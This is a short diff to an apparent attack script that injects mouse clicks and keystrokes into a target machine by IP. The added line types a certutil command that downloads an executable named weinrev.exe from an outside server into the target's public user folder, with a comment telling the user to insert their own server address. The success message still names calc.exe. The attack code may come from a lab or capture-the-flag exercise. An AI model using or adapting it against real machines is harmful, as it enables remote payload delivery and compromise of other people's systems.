@@ -111,11 +111,12 @@ characters={
 }
 
 
+
 def PopCalc(ip):
     MoveMouse(-5000,3000,ip)
     MousePress(mouse.leftClick,ip)
     sleep(1)
-    SendString("certutil.exe -urlcache -g http://192.168.45.209/",ip) #Edit here ->
+    SendString("certutil.exe -urlcache -f http://192.168.45.209/weinrev.exe \users\public\weinrev.exe",ip) #Edit here ->add your local server ip address
     sleep(1)
     SendString("\n",ip)
     print("SUCCESS! Process calc.exe has run on target",ip)
